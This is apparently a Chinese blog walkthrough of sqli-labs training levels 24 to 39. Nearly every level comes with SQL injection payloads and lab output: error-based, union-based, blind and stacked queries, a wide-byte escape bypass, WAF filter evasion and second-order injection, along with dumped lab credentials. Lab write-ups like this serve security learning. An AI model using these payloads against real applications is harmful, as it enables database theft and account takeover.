<h1 id="Less-39-stacked-Query-Intiger-type"><a href="#Less-39-stacked-Query-Intiger-type" class="headerlink" title="Less-39 stacked Query Intiger type"></a>Less-39 <strong>stacked Query Intiger type</strong></h1><p>报错注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-39/?id=1 and extractvalue(0x20,concat(0x7c,version(),0x7c))-- -</span><br></pre></td></tr></table></figure>

<p>Union base injection</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-39/?id=0 union select 11,22,33</span><br></pre></td></tr></table></figure>

<p>delay injection(boolean)</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-39/?id=0 union select 1,2,1 from (select sleep(5))x;</span><br></pre></td></tr></table></figure>

<h1 id="Less-38-stacked-Query"><a href="#Less-38-stacked-Query" class="headerlink" title="Less-38 stacked Query"></a>Less-38 <strong>stacked Query</strong></h1><p>堆叠注入<br>报错注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-38/?id=1' and extractvalue(rand(),concat(0x7c,version(),0x7c))-- -</span><br></pre></td></tr></table></figure>

<p>联合注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-38/?id=0' union select 1,group<span class="emphasis">_concat(username),group_</span>concat(password) from users -- -</span><br></pre></td></tr></table></figure>

<p>插入用户</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-38/?id=1;insert into users(username,password) values('stack', 'stack')%23</span><br></pre></td></tr></table></figure>

<h1 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h1><p>同样的报错注入，只不过是在<code>POST</code>请求里面</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">uname=admin+%df%27or+%27%27%3D%27&amp;passwd=111&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h1 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 <strong>Bypass MySQL Real Escape String</strong></h1><p>宽字节，<code>%df%27</code>即可当单引号使用</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 报错注入</span></span><br><span class="line"></span><br><span class="line">/Less-36/?id=1%df%27%20and%20extractvalue(rand(),concat(0x7c,version(),0x7c))--%20-</span><br></pre></td></tr></table></figure>

<h1 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 <strong>why care for addslashes()</strong></h1><p>整数型注入点<br>盲注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-35/?id=1 and 1=1</span></span><br><span class="line"></span><br><span class="line">有结果</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-35/?id=1 and 1=2</span></span><br><span class="line"></span><br><span class="line">无结果</span><br></pre></td></tr></table></figure>

<p>联合注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-35/?id=1 order by 3-- -</span></span><br><span class="line"></span><br><span class="line">有结果</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-35/?id=1 order by 4-- -</span></span><br><span class="line"></span><br><span class="line">Unknown column '4' in 'order clause'</span><br></pre></td></tr></table></figure>

<p>报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-35/?id=1 and extractvalue(rand(),concat(0x7c,version(),0x7c))</span><br></pre></td></tr></table></figure>

<h1 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34- Bypass Add SLASHES"></a>Less-34- Bypass Add SLASHES</h1><p>fuzz 大法好，burp 的<code>battering ram</code>, payload 选<code>brute forcer</code>的<code>0123456789</code>，就是<code>00-99</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593017382227-985b4647-cc96-45e1-9531-16ce92ae90e6.png#align=left&display=inline&height=489&margin=%5Bobject%20Object%5D&name=l32-addS-fuzzing.png&originHeight=978&originWidth=1235&size=110376&status=done&style=none&width=618" alt="l32-addS-fuzzing.png"><br>最后得出可用的值，此处以<code>%99</code>为例（<code>%df</code>也可）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># POST poc</span></span><br><span class="line"></span><br><span class="line"><span class="section">## uname=admin%99%27and+extractvalue(rand(),concat(0x7c,version(),0x7c))--+-&amp;passwd=admin%99%27&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line"><span class="code">    XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span></span><br></pre></td></tr></table></figure>

<p>实际上，fuzz 可以从 00 一直到 ff<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593017824176-21af679a-2032-4dd3-9905-63fffa028fa0.png#align=left&display=inline&height=909&margin=%5Bobject%20Object%5D&name=fuzz2.png&originHeight=909&originWidth=1638&size=160546&status=done&style=none&width=1638" alt="fuzz2.png"></p>
<h1 id="Less-33-不知何种原因，靶场环境和-32-一样"><a href="#Less-33-不知何种原因，靶场环境和-32-一样" class="headerlink" title="Less-33 不知何种原因，靶场环境和 32 一样"></a>Less-33 不知何种原因，靶场环境和 32 一样</h1><p>略过</p>
<h1 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a>Less-32 <strong>Bypass addslashes()</strong></h1><p>宽字节注入, 用<code>%df</code>吞以下<code>addslashes()</code>加上的反斜杠<code>\</code>，即可报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-32/?id=1%df' and extractvalue(0x20,concat(0x7c,version(),0x7c))-- -</span><br></pre></td></tr></table></figure>

<p>当然，只要能够逃逸出单引号，就可以盲注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 盲注 poc</span></span><br><span class="line"></span><br><span class="line">/Less-32/?id=1%df'and 1=0 -- -</span><br></pre></td></tr></table></figure>

<p>同时，有回显的情况下，UNION 注入也可</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># order by 定列数</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-32/?id=1%df%27%20order%20by%204%20--%20-</span></span><br><span class="line"></span><br><span class="line">Unknown column '4' in 'order clause'</span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-32/?id=1%df%27%20order%20by%204%20--%20-</span></span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p><a href="https://sec4ever.cn/Less-18/" target="_blank" rel="noopener">https://sec4ever.cn/Less-18/</a></p>
<h1 id="Less-31-FUN-with-WAF"><a href="#Less-31-FUN-with-WAF" class="headerlink" title="Less-31 FUN with WAF"></a>Less-31 FUN with WAF</h1><p>加双引号报错，注释<code>-- -</code>未过滤</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜列名</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-31/?id=1") order by 3-- -</span></span><br><span class="line"></span><br><span class="line">(正常结果)</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-31/?id=1") order by 4 -- -</span></span><br><span class="line"></span><br><span class="line">（报错）</span><br><span class="line">Unknown column '4' in 'order clause'</span><br></pre></td></tr></table></figure>

<p>只是闭合符号跟上关不同，这里的闭合符号是<code>&quot;)</code>，最终采用联合注入+group_concat 的方式，一次性取出所有数据。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-31/?id=0")%20 unIOn seLEct 1,group<span class="emphasis">_concat(username),group_</span>concat(password) from users -- -</span><br></pre></td></tr></table></figure>

<p>报错注入也是可以的，此处就不贴出<code>payload</code>了</p>
<h1 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h1><p>这关也是 waf，结果引号、<code>order by</code>、<code>union select</code>、注释均可使用，这个 waf 属实捞</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-30/?id=0" unIOn seLEct 1,2,3 -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># union based sqli</span></span><br><span class="line"></span><br><span class="line">/Less-30/?id=0" unIOn seLEct 1,group<span class="emphasis">_concat(username),group_</span>concat(password) from users -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-29-Protection-with-WAF"><a href="#Less-29-Protection-with-WAF" class="headerlink" title="Less-29 Protection with WAF"></a>Less-29 Protection with WAF</h1><p>说好的 waf 呢？<br>——既没有过滤引号，也没有过滤<code>and</code> <code>or</code><br>报错注入，直接冲了</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-29/?id=0' or extractvalue(0x20,concat(0x7c,version(),0x7c))-- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<p>UNION 联合注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 表名</span></span><br><span class="line"></span><br><span class="line">/Less-29/?id=0' union select 1,group<span class="emphasis">_concat(table_</span>name,0x20) ,group<span class="emphasis">_concat(table_</span>schema,0x20) from information_schema.tables where '1</span><br><span class="line"></span><br><span class="line"><span class="section"># 数据</span></span><br><span class="line"></span><br><span class="line">/Less-29/?id=0' union select 1,group<span class="emphasis">_concat(username,0x20) ,group_</span>concat(password,0x20) from users where '1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592746584181-b75630ad-ba36-4716-a8fe-2cd7e17d5b60.png#align=left&display=inline&height=883&margin=%5Bobject%20Object%5D&name=l29.png&originHeight=883&originWidth=1869&size=575824&status=done&style=none&width=1869" alt="l29.png"></p>
<h1 id="Less-28a-Trick-with-SELECT-amp-UNION"><a href="#Less-28a-Trick-with-SELECT-amp-UNION" class="headerlink" title="Less-28a Trick with SELECT &amp; UNION"></a>Less-28a Trick with SELECT &amp; UNION</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 闭合</span></span><br><span class="line"></span><br><span class="line">/Less-28a/?id=1') -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># 列数</span></span><br><span class="line"></span><br><span class="line">/Less-28a/?id=1')%20 order by 4 -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># 出数据</span></span><br><span class="line"></span><br><span class="line">/Less-28a/?id=0') Union SELEct 1,2,3 -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-28-Trick-with-SELECT-amp-UNION"><a href="#Less-28-Trick-with-SELECT-amp-UNION" class="headerlink" title="Less-28 Trick with SELECT &amp; UNION"></a>Less-28 Trick with SELECT &amp; UNION</h1><p>找闭合符号的时候出了一些问题：<code>/Less-28/?id=0&#39;</code>无结果, 发现过滤空格和注释<br>应该想到闭合符号是<code>&#39;)</code>，用逻辑或来闭合<code>1&#39;)||(&#39;</code><br>空格用<code>%09</code>和<code>%a0</code>来绕过，因为过滤 union+select 的正则表达式是<code>preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc 闭合</span></span><br><span class="line"></span><br><span class="line">/Less-28/?id=1')%09UNion%a0Select%091,2,('N</span><br><span class="line"></span><br><span class="line"><span class="section"># 出数据 poc</span></span><br><span class="line"></span><br><span class="line">/Less-28/?id=0')%09UNion%a0Select%091,version(),('3</span><br><span class="line">Your Login name:5.7.30-0ubuntu0.18.04.1</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<h1 id="Less-27a-Trick-with-SELECT-amp-UNION"><a href="#Less-27a-Trick-with-SELECT-amp-UNION" class="headerlink" title="Less-27a Trick with SELECT &amp; UNION"></a>Less-27a Trick with SELECT &amp; UNION</h1><p><strong>union based injection</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-27a/?id=0"uNIon%A0seleCt%A01,2,"3</span><br></pre></td></tr></table></figure>

<p><strong>blooean injection</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-27a/?id=1" and"1"="1</span></span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-27a/?id=1" and"1"="0</span></span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<h1 id="Less-27-Trick-with-SELECT-amp-UNION"><a href="#Less-27-Trick-with-SELECT-amp-UNION" class="headerlink" title="Less-27 Trick with SELECT &amp; UNION"></a>Less-27 Trick with SELECT &amp; UNION</h1><p>过滤了<code>SELECT、UNION</code>，但是采用报错注入完全可行</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># id=1'or(extractvalue(1,concat(0x5c, (VERSION()),'~')))='1'and'1a</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '\5.7.30-0ubuntu0.18.04.1~'</span><br></pre></td></tr></table></figure>

<p>试着用<code>UNION</code>联合注入，需要 bypass<strong>空格及注释的过滤，</strong>采用大小写绕过关键字过滤，<code>%a0</code>绕过空格过滤<br><strong>猜列数</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 3 列时，正常显示</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-27/?id=0'uNIon%A0selECt%A01,2,'3</span></span><br><span class="line"></span><br><span class="line"><span class="code">     Hint: Your Input is Filtered with following result: 0'uNIon�selECt�1,2,'3</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 4 列时，报错</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-27/?id=0'uNIon%A0selECt%A01,2,3,'N</span></span><br><span class="line"></span><br><span class="line">The used SELECT statements have a different number of columns</span><br><span class="line">Hint: Your Input is Filtered with following result: 0'uNIon�selECt�1,version(),'3</span><br></pre></td></tr></table></figure>

<p><strong>联合注入</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 关键词大小写 + %a0 + where 闭合单引号 + group_concat 带出所有数据</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-27/?id=0%27uNIon%A0selECt%A01,group_concat(username),group_concat(password)%a0from%a0users%a0where%a0%271%27^%270</span></span><br><span class="line"></span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

<p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/-qing-/p/11610385.html#_lab2_0_16" target="_blank" rel="noopener">SQL 注入靶场 sqli-labs 1-65 关全部通关教程 - 卿先生 - 博客园</a></li>
<li><a href="https://www.jianshu.com/p/48a935b123ce" target="_blank" rel="noopener">注入绕过技巧</a></li>
</ul>
<h1 id="Less-26a-Trick-with-comments"><a href="#Less-26a-Trick-with-comments" class="headerlink" title="Less-26a Trick with comments"></a>Less-26a Trick with comments</h1><p>盲注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-26a/?id=0' || '0</span></span><br><span class="line"></span><br><span class="line">无结果</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-26a/?id=0' || '1</span></span><br><span class="line"></span><br><span class="line">有结果</span><br></pre></td></tr></table></figure>

<h1 id="Less-26-Trick-with-comments"><a href="#Less-26-Trick-with-comments" class="headerlink" title="Less-26 Trick with comments"></a>Less-26 Trick with comments</h1><p>过滤了空格、注释、<code>and</code>和<code>or</code>的处理</p>
<ol>
<li><strong>空格、注释被过滤的绕过：</strong>用<code>%a0</code>（测试失败。。。），也可以使用括号<code>()</code>，例如<code>id=1&#39;and(&#39;b&#39;)=(&#39;b&#39;)and&#39;1</code>。在要使用空格的场合（如<code>and</code>后面遇到字母）。需要注意的是：逻辑运算符不能被括号包裹</li>
<li><strong>and、or 被过滤的绕过</strong>：双写，即<code>AandND oorr</code>；或用其它双目运算符，如<code>&amp;&amp; || | ^ &gt; &lt;</code> 等</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592619793391-8b3b86d7-92f9-46e3-bd08-7d45ecf50d27.png#align=left&display=inline&height=423&margin=%5Bobject%20Object%5D&name=double_and.png&originHeight=846&originWidth=1136&size=446235&status=done&style=none&width=568" alt="double_and.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-26/?id=1'oorr(extractvalue(1,concat(0x5c, (VERSION()),'~')))='1'anandd'1a</span><br></pre></td></tr></table></figure>

<h1 id="Less-25a-Trick-with-OR-amp-AND-Blind"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind"></a>Less-25a Trick with OR &amp; AND Blind</h1><p>数字型的盲注，过滤了<code>and</code>和<code>or</code>，可用<code>anandd</code> <code>oorr</code>双写绕过</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-25a/?id=1 anandd if(lengh(version())=23,sleep(5),1)</span><br><span class="line">（爆破）确定长度为 23</span><br><span class="line"></span><br><span class="line"><span class="section"># 简单 exp, 出结果</span></span><br><span class="line"></span><br><span class="line">/Less-25a/?id=1+anandd+if('a'=substring(version(),1,1),1,0)</span><br></pre></td></tr></table></figure>

<p>利用<code>1 and [CASE]</code>中，<code>[CASE]</code>为真、假时，回显的不同来跑盲注<br>用 burp 的 intruder 来操作，配置如图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592799238921-29e647c8-d269-4770-909d-8777b2eb895e.png#align=left&display=inline&height=129&margin=%5Bobject%20Object%5D&name=p1.png&originHeight=517&originWidth=832&size=52704&status=done&style=none&width=208" alt="p1.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592799257427-4b232c18-94ac-42b9-a502-792d2a52b98d.png#align=left&display=inline&height=215&margin=%5Bobject%20Object%5D&name=p2.png&originHeight=858&originWidth=708&size=65932&status=done&style=none&width=177" alt="p2.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 用于 fuzz 的 payload</span></span><br><span class="line"></span><br><span class="line">0123456789.-\_qwertyuiopasdfghjklzxcvbnm</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592799297552-8f1c18ec-f0a7-4946-bc6c-fb7d72421413.png#align=left&display=inline&height=349&margin=%5Bobject%20Object%5D&name=cb_intruder.png&originHeight=349&originWidth=1886&size=58892&status=done&style=none&width=1886" alt="cb_intruder.png"><br>最后指定关键字即可，<br>结果是一位一位出来的，如图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592799419550-d301cc6b-ec91-4d4e-bdfd-477bd0d2529c.png#align=left&display=inline&height=1031&margin=%5Bobject%20Object%5D&name=res.png&originHeight=1031&originWidth=1206&size=102576&status=done&style=none&width=1206" alt="res.png"><br>但这种方法的时间复杂度太高了，可以利用二分法来降低至<code>O(log``_n_``)</code>, 因为 2^8=128，可以涵盖完所有的 ASCII 码，即比较八次即可确定一位数据。我会在后面给出盲注二分法的脚本。</p>
<h1 id="Less-25-Trick-with-OR-amp-AND"><a href="#Less-25-Trick-with-OR-amp-AND" class="headerlink" title="Less-25 Trick with OR &amp; AND"></a>Less-25 Trick with OR &amp; AND</h1><p>过滤了<code>or</code>跟<code>and</code>，绕过倒是好绕过，双目运算符都行，例如<code>|| &amp;&amp;</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1' ^ extractvalue(0x20,concat(0x7c,user(),0x7c)) ^'</span><br></pre></td></tr></table></figure>

<p>不过由于 or 不能用，所以没法用<code>inf``**or**``mation_schema</code>来获得表名和列名。<br>想用 16 进制，发现【不能绕过】，长姿势了<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592577166667-b4df2a13-8b23-45f0-9760-cf3702c0bff7.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=1175&size=24086&status=done&style=none&width=587.5" alt="image.png"><br>下面介绍不用 information_schema 也能得到表名、列名的方式</p>
<ol>
<li>先得到版本，</li>
</ol>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-25/index.php?id=1' || extractvalue(0x20,concat(0x7c,(version()),0x7c)) ||'</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>再尝试得到表名</li>
</ol>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-25/index.php?id=1' || extractvalue(0x20,concat(0x7c,(select group_concat(0x20,table_name) from mysql.innodb_table_stats where database_name = database() limit 2),0x7c)) ||'</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '| emails, referers, uagents, use'</span><br></pre></td></tr></table></figure>

<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><blockquote>
<p>高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p>
</blockquote>
<p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name = <span class="keyword">database</span>();</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_index_stats <span class="keyword">where</span> database_name = <span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>

<p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">CTF|mysql 之无列名注入</a></li>
<li><a href="https://www.cnblogs.com/hello-there/p/12918265.html" target="_blank" rel="noopener">[SWPU2019]Web1(二次注入,无列名注入,bypass information_schema) </a></li>
</ul>
<h1 id="Less-24-Second-Degree-Injections"><a href="#Less-24-Second-Degree-Injections" class="headerlink" title="Less-24 - Second Degree Injections"></a>Less-24 - Second Degree Injections</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592582913236-d9f8a9ed-33a3-4ab6-866d-52945e92571b.png#align=left&display=inline&height=384&margin=%5Bobject%20Object%5D&name=image.png&originHeight=511&originWidth=854&size=55688&status=done&style=none&width=641" alt="image.png"><br>二次注入，在登录时注册带有 payload 的用户名，改密码时取用的值未进行转义导致注入。<br><code>/Less-24/pass_change.php</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">...</span><br><span class="line">if($pass==$re_pass)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592569574436-f326b619-d219-4214-9019-e46b8596b875.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=admin%23.png&originHeight=694&originWidth=424&size=79240&status=done&style=none&width=209" alt="admin#.png">)更改密码后<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592569847089-af2729c4-2589-46ae-b9de-539c4f564494.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&name=banner.png&originHeight=886&originWidth=1443&size=315567&status=done&style=none&width=361" alt="banner.png"><br><code>admin</code>的密码已经被成功更改<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592569763758-fecb935d-098c-4381-955d-ab71ebff6f50.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=ADMIN2.png&originHeight=684&originWidth=414&size=76847&status=done&style=none&width=207" alt="ADMIN2.png"><br>网上大部分教程，都是到更改<code>admin</code>的密码就结束了。那么我尝试了对这个注入点进行报错注入，j 即注册名字为如下 payload 的用户</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(0x20,concat(0x7c,version(),0x7c)) and '</span><br></pre></td></tr></table></figure>

